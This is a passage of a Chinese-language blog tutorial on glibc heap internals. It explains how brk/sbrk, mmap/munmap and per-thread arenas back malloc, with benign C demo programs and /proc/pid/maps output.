title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h3><p>在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 <a href="http://man7.org/linux/man-pages/man2/sbrk.2.html">(s)brk</a> 函数以及 <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap, munmap</a> 函数。</p><p>如下图所示，我们主要考虑对堆进行申请内存块的操作。</p><p><img src="/./../00000000/image-20250410153600020.png" alt="image-20250410153600020"></p><h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 <a href="https://en.wikipedia.org/wiki/Sbrk">brk</a> 的大小来向操作系统申请内存。</p><p><strong>初始时</strong>，堆的起始地址 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">start_brk</a> 以及堆的当前末尾 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a> 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，<strong>start_brk 以及 brk 会指向 data&#x2F;bss 段的结尾</strong>。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，<strong>只是这个位置是在 data&#x2F;bss 段结尾后的随机偏移处</strong>。</li></ul><p>具体效果如下图（这个图片与网上流传的基本一致，这里是因为要画一张大图，所以自己单独画了下）所示</p><p><img src="/./../00000000/image-20250410153726089.png" alt="image-20250410153726089"></p><h6 id="学习范例："><a href="#学习范例：" class="headerlink" title="学习范例："></a>学习范例：</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* sbrk and brk example */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">void</span> *curr_brk, *tmp_brk = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//定义了两个指针，分别存储当前堆空间的结束位置，和临时存储堆空间的结束位置</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());<br><span class="hljs-comment">//打印进程</span><br>        <span class="hljs-comment">/* sbrk(0) gives current program break location */</span><br>        tmp_brk = curr_brk = sbrk(<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">//赋值为当前堆空间的结束地址</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);<br>        <span class="hljs-comment">//打印当前堆空间的结束地址</span><br>    getchar();<br><span class="hljs-comment">//getchar函数等待输入字符，便于观察堆空间的变化</span><br>        <span class="hljs-comment">/* brk(addr) increments/decrements program break location */</span><br>        <br>    brk(curr_brk+<span class="hljs-number">4096</span>);<br><span class="hljs-comment">//调用brk()为堆空间的结束位置增加4096字节(通常是一个页面的大小)</span><br>        <br>    curr_brk = sbrk(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);<br>        <span class="hljs-comment">//打印当前堆空间的结束地址</span><br>    getchar();<br><br>        brk(tmp_brk);<br><span class="hljs-comment">//将堆空间的结束地址回复为初始值</span><br>        curr_brk = sbrk(<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">//将显式的指针值也修改为当前堆空间的结束地址</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);<br>        <span class="hljs-comment">//打印当前堆空间的结束地址</span><br>    getchar();<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是，在每一次执行完操作后，都执行了 getchar() 函数，这是为了我们方便我们查看程序真正的映射。</p><p><strong>用pwndbg调试</strong></p><p><strong>第一次调用 brk 之前</strong></p><p>并没有出现堆</p><p><strong>第一次增加 brk 后</strong></p><p>出现了堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//当然在调用一些函数时也会分配堆</span><br></code></pre></td></tr></table></figure><p><strong>其中一些数据的理解</strong></p><p>范例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk<br>Welcome to sbrk example:6141<br>Program Break Location1:0x804b000<br>Program Break Location2:0x804c000<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps<br>...<br>0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk<br>0804b000-0804c000 rw-p 00000000 00:00 0          [heap]<br>b7e21000-b7e22000 rw-p 00000000 00:00 0<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><p>其中，关于堆的那一行</p><ul><li>0x0804b000 是相应堆的起始地址</li><li>rw-p 表明堆具有可读可写权限，并且属于隐私数据。</li><li>00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为 0。</li><li>00:00 是主从 (Major&#x2F;mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为 0。</li><li>0 表示着 Inode 号。由于这部分内容并不是从文件中映射得到的，所以为 0。</li></ul><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>malloc 会使用 <a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285">mmap</a> 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p><p>范例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Private anonymous mapping example using mmap syscall */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg)</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s failed. Exiting the process\n&quot;</span>, msg);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-comment">//定义了一个简单的错误处理函数，用于打印错误信息并退出程序</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">int</span> ret = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());<br>    <span class="hljs-comment">//打印进程</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before mmap\n&quot;</span>);<br>        getchar();<br>    <br>        <span class="hljs-type">char</span>* addr = <span class="hljs-literal">NULL</span>;<br>        addr = mmap(<span class="hljs-literal">NULL</span>, (<span class="hljs-type">size_t</span>)<span class="hljs-number">132</span>*<span class="hljs-number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <br>    <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>                errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-comment">//如果mmap调用失败，调用自定义错误处理函数打印错误信息并退出程序</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After mmap\n&quot;</span>);<br>        getchar();<br><br>        <span class="hljs-comment">/* Unmap mapped region. */</span><br>        ret = munmap(addr, (<span class="hljs-type">size_t</span>)<span class="hljs-number">132</span>*<span class="hljs-number">1024</span>);<br>    <br>        <span class="hljs-keyword">if</span>(ret == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;munmap&quot;</span>);<br>        <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After munmap\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于可能版本和系统架构的不同，我就不在自己做这个实验，直接去理解原文的实验结果</p><p><strong>mmap函数</strong></p><p><strong><code>mmap</code> 的参数</strong>：</p><ul><li><code>NULL</code>：让系统选择映射的起始地址。</li><li><code>size</code>：映射区域的大小。</li><li><code>PROT_READ|PROT_WRITE</code>：指定映射区域的保护权限为可读写。</li><li><code>MAP_PRIVATE | MAP_ANONYMOUS</code>：创建一个私有匿名映射区域。</li><li><code>-1</code> 和 <code>0</code>：对于匿名映射，文件描述符和偏移量通常设置为 <code>-1</code> 和 <code>0</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//匿名映射：不会与任何文件关联，而是直接分配内存页。这种映射方式通常用于动态内存分配，类似于 malloc，但更灵活，因为它可以指定内存的保护权限和映射类型。</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//私有映射: 意味着对该映射区域的修改不会影响其他进程.如果多个进程共享同一个匿名映射区域（使用 MAP_SHARED），则一个进程对映射区域的修改会影响其他进程。而 MAP_PRIVATE 确保每个进程的修改独立。</span><br></code></pre></td></tr></table></figure><p><strong>munmap函数</strong></p><ul><li>调用 <code>munmap</code> 释放之前通过 <code>mmap</code> 创建的内存区域：<ul><li><code>addr</code>：映射区域的起始地址。</li><li><code>(size_t)132*1024</code>：映射区域的大小。</li></ul></li></ul><p><strong>执行mmap前</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps<br>08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>b7e21000-b7e22000 rw-p 00000000 00:00 0<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><p>可以看到只有.so的mmap段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//.so文件是 Linux 和其他类 Unix 系统中的一种共享库（Shared Object）文件格式。它类似于 Windows 系统中的 .dll 文件，用于在多个程序之间共享代码和数据。使用共享库可以减少内存占用、节省磁盘空间，并提高程序的运行效率。</span><br></code></pre></td></tr></table></figure><p><strong>执行mmap后</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps<br>08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>b7e00000-b7e22000 rw-p 00000000 00:00 0<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><p>我们申请的内存与已经存在的内存段结合在了一起构成了 b7e00000 到 b7e21000 的 mmap 段。</p><p><strong>munmap</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps<br>08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>b7e21000-b7e22000 rw-p 00000000 00:00 0<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><p>原来申请的内存段消失了，内存段恢复成了原来的样子</p><h4 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h4><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。</p><p>在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Per thread arena example. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">threadFunc</span><span class="hljs-params">(<span class="hljs-type">void</span>* arg)</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before malloc in thread 1\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-type">char</span>* addr = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After malloc and before free in thread 1\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-built_in">free</span>(addr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After free in thread 1\n&quot;</span>);<br>        getchar();<br>&#125;<br><span class="hljs-comment">//就是用来观察多线程的内存分配情况的一个函数</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">pthread_t</span> t1;<br>    <span class="hljs-comment">//线程创建</span><br>        <span class="hljs-type">void</span>* s;<br>        <span class="hljs-type">int</span> ret;<br>        <span class="hljs-type">char</span>* addr;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before malloc in main thread\n&quot;</span>);<br>        getchar();<br>        addr = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After malloc and before free in main thread\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-built_in">free</span>(addr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After free in main thread\n&quot;</span>);<br>        getchar();<br>    <br>        ret = pthread_create(&amp;t1, <span class="hljs-literal">NULL</span>, threadFunc, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//创建子线程t1，线程函数为threadFunc()</span><br>        <span class="hljs-keyword">if</span>(ret)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread creation error\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-comment">//创建失败打印错误信息并退出</span><br>        ret = pthread_join(t1, &amp;s);<br><span class="hljs-comment">//使用pthread_join()等待子线程结束</span><br>        <span class="hljs-keyword">if</span>(ret)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread join error\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-comment">//等待失败，打印错误信息并退出</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>**线程同步：**主线程通过 <code>pthread_join</code> 等待子线程完成，确保程序在子线程结束后才退出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena example::6501<br>Before malloc in main thread<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps<br>08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>b7e05000-b7e07000 rw-p 00000000 00:00 0<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>第一次申请之前</strong>， 没有任何任何堆段。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena example::6501<br>Before malloc in main thread<br>After malloc and before free in main thread<br>...<br>sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps<br>08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p 00000000 00:00 0          [heap]<br>b7e05000-b7e07000 rw-p 00000000 00:00 0<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>第一次申请后</strong>， 从上面的输出可以看出，堆段被建立了，并且它就紧邻着数据段，这说明 malloc 的背后是用 brk 函数来实现的。同时，需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了 0x0806c000-0x0804b000&#x3D;0x21000 个字节的堆。**这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。**我们称这一块连续的内存区域为 <strong>arena</strong>。此外，我们称由主线程申请的内存为 <strong>main_arena</strong>。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena example::6501<br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>...<br>sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps<br>08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p 00000000 00:00 0          [heap]<br>b7e05000-b7e07000 rw-p 00000000 00:00 0<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在主线程释放内存后</strong>，我们从上面的输出可以看出，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena example::6501<br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread 1<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps<br>08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p 00000000 00:00 0          [heap]<br>b7604000-b7605000 ---p 00000000 00:00 0<br>b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在第一个线程 malloc 之前</strong>，我们可以看到并没有出现与线程 1 相关的堆，但是出现了与线程 1 相关的栈。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena example::6501<br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread 1<br>After malloc and before free in thread 1<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps<br>08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p 00000000 00:00 0          [heap]<br>b7500000-b7521000 rw-p 00000000 00:00 0<br>b7521000-b7600000 ---p 00000000 00:00 0<br>b7604000-b7605000 ---p 00000000 00:00 0<br>b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>第一个线程 malloc 后</strong>， 我们可以从下面输出看出线程 1 的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是 132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为 mmap 